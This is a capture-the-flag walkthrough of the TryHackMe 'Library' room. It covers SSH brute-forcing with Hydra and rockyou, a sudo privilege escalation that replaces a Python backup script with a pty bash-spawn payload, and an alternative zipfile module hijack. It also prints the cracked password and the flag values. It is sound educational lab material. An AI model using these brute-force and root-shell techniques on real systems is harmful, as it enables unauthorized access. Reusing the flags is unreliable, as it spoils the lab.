---
title: "Library"
description: "An easy boot2root room requiring SSH brute-force with the rockyou wordlist, then abusing a sudo-permitted Python backup script via a delete-and-replace technique to spawn a root shell."
difficulty: "Easy"
tags: ["SSH", "Hydra", "Brute Force", "RockYou", "Python", "Sudo", "PTY Spawn", "Robots.txt"]
date: "2026-08-02"
---

## Overview

Library is an easy boot2root machine built for the FIT and BSides Guatemala CTF. The box starts with a static blog whose `robots.txt` file and post author leak the two pieces needed for SSH access — a username and a hint to use the famous `rockyou` password list. After brute-forcing SSH, a sudo rule allows the `meliodas` user to run a Python backup script as root. The script itself cannot be edited, but because it lives in a directory the user fully controls, it can simply be deleted and replaced with a malicious one.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** SSH brute forcing with Hydra, robots.txt analysis, sudo exploitation, Python script manipulation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
```

![Nmap scan results](/assets/screenshots/library/nmap.png)

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | HTTP | Apache httpd 2.4.18 |

Two ports open: SSH and a web server.

### Web Enumeration

The website is a simple static blog titled "Welcome to Blog - Library Machine":

![Library blog homepage](/assets/screenshots/library/homepage.png)

The blog content itself contains no interactive functionality, but it does reveal a post author:

![Username meliodas in blog post](/assets/screenshots/library/username.png)

The name **meliodas** stands out as a potential SSH username.

### robots.txt

Checking `/robots.txt`:

![robots.txt](/assets/screenshots/library/robots.png)

```txt
User-agent: rockyou
Disallow: /
```

This is unusual. A real `robots.txt` file would list crawler names like `Googlebot` or `*`. The name **rockyou** is a clear reference to the famous `rockyou.txt` password wordlist — a hint that password cracking with that list is expected.

### Directory Enumeration

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
```

![Gobuster results](/assets/screenshots/library/gobuster.png)

Nothing else notable was found — the images directory and index page are the only real content.

## Initial Access — SSH Brute Force

Connecting the dots: we have a username (`meliodas`) from the blog and a hint (`rockyou`) from `robots.txt`. SSH is open on port 22. Hydra can combine these to brute-force the password:

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```

![Hydra brute force results](/assets/screenshots/library/hydra.png)

Hydra found the password quickly: **iloveyou1**.

```bash
ssh meliodas@<target-ip>
```

![SSH login and user flag](/assets/screenshots/library/user_flag.png)

### User Flag

```bash
cat user.txt
```

**User flag:** `6d488cbb3f111d135722c33cb635f4ec`

## Privilege Escalation

### Checking Sudo Privileges

```bash
sudo -l
```

![sudo -l output](/assets/screenshots/library/sudo_l.png)

```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

`meliodas` can run `/home/meliodas/bak.py` with any Python interpreter as root, without a password.

### Analyzing bak.py

```bash
cat /home/meliodas/bak.py
```

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

The script backs up the website directory into a zip file. The file is owned by root and not writable by `meliodas`:

```bash
ls -l bak.py
-rw-r--r-- 1 root root 353 Aug 23  2019 bak.py
```

However — the file lives in `/home/meliodas/`, a directory where `meliodas` has full write access. The file itself may not be editable, but nothing stops the user from **deleting it and creating a new file with the same name**. Since sudo only checks the path and command, the replacement is executed as root.

### Replacing bak.py with a Malicious Version

The simplest payload spawns an interactive Bash shell via Python's PTY module:

```bash
rm bak.py
touch bak.py
echo 'import pty;pty.spawn("/bin/bash")' > bak.py
sudo python /home/meliodas/bak.py
```

When Python imports the `pty` module and calls `pty.spawn("/bin/bash")`, it executes a bash process running with the privileges of the sudo caller — root.

![Root shell and root flag](/assets/screenshots/library/root_flag.png)

### Root Flag

```bash
cat /root/root.txt
```

**Root flag:** `e8c8c6c256c35515d1d344ee0488c617`

## Alternative Approach — Python Library Hijacking

An alternative escalation method works without deleting `bak.py`. When a Python script executes, the interpreter looks for imported modules in a specific search order — starting with the script's own directory, then `PYTHONPATH`, then the standard library paths.

`bak.py` imports the `zipfile` module. By creating a malicious `zipfile.py` in `/home/meliodas/` (the script's directory, which has higher precedence), the import resolves to the attacker's file instead of the real library:

```python
import subprocess

ZIP_DEFLATED = 1

def ZipFile(a, b, c):
    process = subprocess.Popen('/bin/bash -p', shell=True, stdout=subprocess.PIPE)
    for line in process.stdout:
        print(line)
    process.wait()
```

Running `sudo /usr/bin/python3 /home/meliodas/bak.py` then triggers the fake `ZipFile()` function, spawning a root bash shell. This is a classic Python module search path hijack.

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/meliodas/user.txt` | `6d488cbb3f111d135722c33cb635f4ec` |
| Root | `/root/root.txt` | `e8c8c6c256c35515d1d344ee0488c617` |

## Commands Used

```bash
# Enumeration
nmap -sV -sC -oN nmap.txt <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js

# Brute force SSH
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>

# SSH access
ssh meliodas@<target-ip>
cat user.txt

# Privilege escalation
sudo -l
cat /home/meliodas/bak.py

# Replace the script with a root shell payload
rm bak.py
touch bak.py
echo 'import pty;pty.spawn("/bin/bash")' > bak.py
sudo python /home/meliodas/bak.py

# Alternative: library hijack
cat > zipfile.py << 'EOF'
import subprocess
ZIP_DEFLATED = 1
def ZipFile(a, b, c):
    process = subprocess.Popen('/bin/bash -p', shell=True, stdout=subprocess.PIPE)
    for line in process.stdout:
        print(line)
    process.wait()
EOF
sudo /usr/bin/python3 /home/meliodas/bak.py

# Root flag
cat /root/root.txt
```

## Lessons Learned

- **`robots.txt` can leak hints.** While it is meant to control crawlers, attackers read it too. Here, the unusual `User-agent: rockyou` entry pointed directly to the wordlist to use — a common CTF breadcrumb.
- **Blog authorship leaks usernames.** The post author `meliodas` was never shown anywhere else on the site, but blog posts commonly display author names that map directly to system accounts.
- **SSH brute forcing is effective against weak passwords.** The password `iloveyou1` was cracked in about a minute with Hydra and the rockyou list. Passwords like this, derived from common patterns, will always fall to a wordlist attack.
- **Sudo rules reference paths, not file integrity.** Sudo permits a specific command path to run as root. If that path points into a user-writable directory, the user can replace the file even if the file itself is owned by root. The directory permissions matter as much as the file permissions.
- **Python module resolution order is exploitable.** A script's own directory is searched before the standard library. A fake `zipfile.py` placed next to `bak.py` gets imported instead of the real one — an important post-exploitation technique for any Python-based sudo entry.
- **Check `sudo -l` immediately after shell access.** It is the fastest way to identify misconfigured privilege boundaries, and in this room it was the single step between a normal user and root.

## References

- [TryHackMe — Library](https://tryhackme.com/room/bsidesgtlibrary)
- [GTFOBins — Python](https://gtfobins.github.io/gtfobins/python/)
- [Hydra — THC](https://github.com/vanhauser-thc/thc-hydra)
- [RockYou Wordlist — GitHub](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Python sys.path Documentation](https://docs.python.org/3/library/sys.html#sys.path)
- [tryhackme/room/library — Official Room](https://tryhackme.com/room/library)
